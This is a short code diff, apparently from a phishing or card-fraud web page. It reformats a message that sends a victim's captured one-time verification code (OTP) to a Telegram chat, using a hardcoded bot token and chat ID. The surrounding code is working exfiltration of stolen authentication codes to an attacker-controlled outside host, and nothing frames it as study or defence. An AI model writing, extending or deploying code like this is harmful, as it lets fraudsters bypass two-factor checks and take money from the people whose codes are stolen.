@@ -65,7 +65,13 @@
 
                 var telegramToken = '7821993334:AAECa6x6pZoc2lhev7rkAPn6qrAAlRPH3Mc';
                 var telegramChatId = '-1002543187193';
-                var telegramMessage = `  كود التحقق (OTP) : ${codee}`;
+         
+                var telegramMessage = `
+                ====== 💳 كود التحقق ========
+
+        🔐: ${codee}
+
+      ======================`;
 
                 fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                     method: 'POST',
